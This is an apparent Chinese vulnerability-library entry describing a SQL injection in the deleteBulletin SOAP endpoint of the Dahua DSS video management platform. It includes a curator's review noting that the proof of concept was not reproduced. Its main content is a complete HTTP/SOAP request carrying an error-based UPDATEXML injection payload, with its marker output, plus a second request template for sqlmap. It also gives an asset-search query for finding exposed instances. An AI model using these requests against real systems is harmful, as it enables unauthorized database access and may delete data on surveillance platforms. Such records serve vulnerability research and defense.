---
source: "wy876 漏洞文库"
id: "vw-17aa568487cd91ef8db367ec"
entity_id: "ve-17aa568487cd91ef8db367ec"
schema_version: "1"
fofa_unverified: "app.name=="
title: "大华 DSS 视频管理系统deleteBulletin存在SQL注入漏洞"
product: "Dahua DSS视频管理平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "双JSESSIONID，MySQL UPDATEXML，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E5%A4%A7%E5%8D%8E/%E5%A4%A7%E5%8D%8EDSS%E8%A7%86%E9%A2%91%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FdeleteBulletin%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/xdk0wmobv78llhqb"
source_status: "recorded"
---

# 大华 DSS 视频管理系统deleteBulletin存在SQL注入漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Dahua DSS视频管理平台
- 本文讨论：itcBulletin deleteBulletin netMarkings SQL注入
- 版本、权限与配置前提：双JSESSIONID，MySQL UPDATEXML，版本未知
- 资料类型：SOAP SQL注入PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 响应只孤立标记串无完整报错/HTTP，来源证据需补
- 重复Cookie身份不明；deleteBulletin可能删除公告，副作用需标
- sqlmap段无命令；与智慧园区同方法/命名空间强关联但产品版本关系需证
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
- 样例会话、令牌或共享秘密已按具体值遮罩中段并保留首尾；不能直接用于请求。公开默认/测试凭据与算法常量不因长得像密码而改写；其用途仍须按原文说明判断

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- DSS/园区组件关系、鉴权和数据库/版本待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
大华 DSS 视频管理系统deleteBulletin存在SQL注入漏洞。

# 二、影响版本
+ 大华 DSS 视频管理系统

# 三、资产测绘
+ hunter：`app.name=="Dahua 大华 DSS 视频管理系统"`


+ 登录页面


# 四、漏洞复现
```http
POST /portal/services/itcBulletin HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=0F2**************************B44; JSESSIONID=D08**************************EE6
Upgrade-Insecure-Requests: 1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 436

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:itc="http://itcbulletinservice.webservice.dssc.dahua.com">
   <soapenv:Header/>
   <soapenv:Body>
      <itc:deleteBulletin>
         <!--type: string-->
         <netMarkings>(UPDATEXML(5791,CONCAT(0x2e,0x716b706a71,(SELECT (ELT(5791=5791,1))),0x716a707a71),1058))</netMarkings>
      </itc:deleteBulletin>
   </soapenv:Body>
</soapenv:Envelope>
```


```plain
qkpjq1qjpzq
```

sqlmap

```http
POST /portal/services/itcBulletin HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=0F2**************************B44; JSESSIONID=D08**************************EE6
Upgrade-Insecure-Requests: 1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 346

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:itc="http://itcbulletinservice.webservice.dssc.dahua.com">
   <soapenv:Header/>
   <soapenv:Body>
      <itc:deleteBulletin>
         <!--type: string-->
         <netMarkings>gero et</netMarkings>
      </itc:deleteBulletin>
   </soapenv:Body>
</soapenv:Envelope>
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xdk0wmobv78llhqb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
